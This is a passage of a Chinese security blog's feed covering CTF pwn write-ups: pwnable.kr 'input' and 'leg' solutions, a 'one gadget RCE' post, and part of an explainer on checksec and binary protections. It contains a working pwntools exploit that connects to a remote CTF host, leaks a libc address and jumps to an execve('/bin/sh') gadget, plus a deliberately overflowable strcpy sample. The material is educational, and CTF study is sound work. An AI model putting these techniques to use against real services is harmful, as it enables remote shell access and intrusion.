class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中，我们可以看出 rand函数产生的是伪随机数,每次产生出的是固定值，在本地跑一下发现固定为1804289383,于0xdeadbeef异或后得到3039230856</p><h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><p><strong>时间</strong> 2017-01-26<br>题目源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//参数个数为100-1 ,argv[0]是程序路径及名称</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//argv[65]</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//argv[66]</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio 用管道重定向该进程的标准输入</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);<span class="comment">//从标准输入中读</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);<span class="comment">//从标准错误输出中读</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//设置环境变量</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file 从文件\x0a中 读出4字节 判断是否为 \x00\x00\x00\x00</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );<span class="comment">//监听端口为argv[67]</span></span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有/tmp目录下才有写权限，而最后读flag的语句为 /bin/cat flag，所以要将flag文件链接到/tmp目录下，在/tmp目录下新建软链接：<br>所以： 只需要</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/input/flag /tmp/flag    </span><br></pre></td></tr></table></figure><h1 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h1><p>这是第八个吧，这是arm汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;push&#123;r6&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;addr6, pc, $1\n&quot;</span></span><br><span class="line"><span class="string">&quot;bxr6\n&quot;</span></span><br><span class="line"><span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line"><span class="string">&quot;movr3, pc\n&quot;</span></span><br><span class="line"><span class="string">&quot;addr3, $0x4\n&quot;</span></span><br><span class="line"><span class="string">&quot;push&#123;r3&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;pop&#123;pc&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;.code32\n&quot;</span></span><br><span class="line"><span class="string">&quot;pop&#123;r6&#125;\n&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"><span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY); <span class="number">0x00008ce4</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">write(<span class="number">0</span>, buf, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中来看，我们知道关键是<code>key1</code> <code>key2</code> <code>key3</code>，所以我们需要的是去找到他们的返回值，具体从代码来看 已知条件是</p><ul><li>前4个参数分别放在R0，R1，R2，R3中，多出来的才存在栈上</li><li>函数返回值存在R0中</li><li>LR保存函数的返回地址（函数调用时的下一条指令地址）</li><li>PC保存当前指令的下2条指令地址，在arm模式下为 当前指令地址+8，在thumb模式下为 当前指令地址+4<br>分别看三个key的汇编</li><li>*key1**<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br></pre></td></tr></table></figure>pc为返回值，在执行到mov r3,pc时，PC的值为0x8cdc+8，即0x8ce4。    </li><li>*key2**<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br></pre></td></tr></table></figure>进行了arm到thumb的切换，其中add r6，pc #1只是为了跳转到thumb，跳转之后地址并没有加一。当执行到mov r3,pc时，PC的值为0x8d04+4，即0x8d08，后面再加上4得到返回值为0x8d0c。</li><li>*key3**<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br></pre></td></tr></table></figure>将lr的值作为返回值，lr的值为调用函数的下一条指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:movr3, r0</span><br></pre></td></tr></table></figure>key3返回值为0x8d80。所有返回值相加得到 0x8ce4 + 0x8d0c + 0x8d80 =  108400<br>最终flag是 <strong>My daddy has a lot of ARMv5te muscle!</strong></li></ul><p>至此刷完第一排，发现前面的题目还是比较简单的。明天除夕 先祝福大家新年快乐 我也顺便争取明天刷完第一阶梯的题目。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>One gadget rce</title>
      <link href="one-gadget-rce.html"/>
      <url>one-gadget-rce.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>An execve([“/bin/sh”]) gadget,or similar,would be useful</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-01.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-02.png"></a></p><p>上面两图，是我在谷歌学习的时候搜到的内容，在我的理解中，就是在linux下，某些libc中有一个地址，上面的内容是execve([“/bin/sh”]),这意味着，如果我能溢出，并覆盖到这个gadget的地址，那么我很容易就可以getshell了。</p><p>在IDA中，我们通过搜索字符串，/bin/sh可以找到如下图的内容，这就是one gadget rce，</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-03.png"></a></p><p>从汇编来看，我们可以找到他的地址<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-02.png"></a></p><p>上文，我们得知了一个getshell的小技巧，现在，我们来分析一下题目。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-03.png"></a><br>思路是这样的，首先，发送，我们需要去leak的地址的got，printf会帮我们读到他的地址，之后，我们只需要取值，然后去leak one gadget rce，计算他在内存中的地址，就能getshell了。<br>exp如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">puts_addr = <span class="number">0x000000000006FD60</span></span><br><span class="line">binsh_addr = <span class="number">0x00000000000E66BD</span></span><br><span class="line">r = remote(<span class="string">&quot;59.110.6.128&quot;</span>, <span class="number">10086</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./oneshot&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendline(str(<span class="number">0x600AD8</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Value: &quot;</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">&quot;\n&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">puts_addr = int(data,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] puts addr:&#123;0&#125;&quot;</span>.format(hex(puts_addr))</span><br><span class="line">one_shot_rce = puts_addr - <span class="number">0x00000000006fd60</span> + <span class="number">0x00000000000E66BD</span>  <span class="comment">#one gadget rce addr </span></span><br><span class="line">r.sendline(str(one_shot_rce))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.yumpu.com/en/document/view/37809267/dragons-ctf/37">https://www.yumpu.com/en/document/view/37809267/dragons-ctf/37</a><br>题目链接：<br><a href="http://pan.baidu.com/s/1qYjMJVY">http://pan.baidu.com/s/1qYjMJVY</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>checksec以及其包含的保护机制</title>
      <link href="Checksec-and-the-protection-mechanisms-it-contains.html"/>
      <url>Checksec-and-the-protection-mechanisms-it-contains.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="checksec及其包含的保护机制"><a href="#checksec及其包含的保护机制" class="headerlink" title="checksec及其包含的保护机制"></a>checksec及其包含的保护机制</h2><p>今天由于编译程序的时候，老是不知道怎么只开启自己想要的保护，所以稍微查阅了一些资料。<br>安全机制包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p><h2 id="一、checksec"><a href="#一、checksec" class="headerlink" title="一、checksec"></a>一、checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。<br>源码下载地址：<br><a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a><br><a href="https://github.com/slimm609/checksec.sh/">https://github.com/slimm609/checksec.sh/</a><br>下载地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</span><br></pre></td></tr></table></figure><h3 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h3><p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>checksec的使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec –file /usr/sbin/sshd</span><br></pre></td></tr></table></figure><p>如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/checksec.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/checksec.png"></a></p><h2 id="二、CANNARY-栈保护"><a href="#二、CANNARY-栈保护" class="headerlink" title="二、CANNARY(栈保护)"></a>二、CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。<br>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h2 id="三、FORTIFY"><a href="#三、FORTIFY" class="headerlink" title="三、FORTIFY"></a>三、FORTIFY</h2><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。<br>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, s);</span><br><span class="line">        <span class="comment">/* Don&#x27;t allow gcc to optimise away the buf */</span></span><br><span class="line">        <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> :: <span class="string">&quot;m&quot;</span> (buf))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用包含参数-U_FORTIFY_SOURCE编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; 将0x118存储到栈上</span><br><span class="line">  mov    0x8(%ebp),%eax     ; 将目标参数载入eax</span><br><span class="line">  mov    %eax,0x4(%esp)     ; 保存目标参数</span><br><span class="line">  lea    -0x108(%ebp),%eax  ; 数组buf</span><br><span class="line">  mov    %eax,(%esp)        ; 保存</span><br><span class="line">  call   8048320 &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                     ; </span><br><span class="line">  